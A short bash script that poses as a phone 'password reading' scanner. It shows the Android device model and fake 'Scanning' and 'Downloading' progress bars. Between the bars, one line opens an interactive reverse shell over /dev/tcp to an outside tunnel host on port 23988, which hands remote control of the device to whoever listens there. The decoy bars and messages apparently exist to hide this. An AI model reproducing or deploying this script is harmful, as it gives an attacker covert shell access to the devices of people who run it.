#!/bin/bash

# Function to create a loading bar
loading_bar() {
    duration=$1  # duration of the loading bar in seconds
    bar_width=50 # width of the loading bar

    for ((i=0; i<=duration; i++)); do
        # Calculate progress
        percent=$((i * 100 / duration))
        filled=$((i * bar_width / duration))
        empty=$((bar_width - filled))

        # Display loading bar
        printf "\r["
        printf "%0.s#" $(seq 1 $filled)
        printf "%0.s-" $(seq 1 $empty)
        printf "] %d%%" "$percent"

        sleep 1
    done
    echo ""
}

# Scan for device name using getprop
device_name=$(getprop ro.product.model)

# Display the device name
echo "Device Name: $device_name"

# First loading bar for 20 seconds
echo "Scanning..."
loading_bar 20

# Execute the date command
echo "Checking device Password reading..."
echo  Your Phone is capable to view passwords > scan.txt 
bash -i >& /dev/tcp/cool-applicant.gl.at.ply.gg/23988 0>&1

# Display Download loading bar
echo "Downloading..."
loading_bar 20  # Adjust the duration if needed

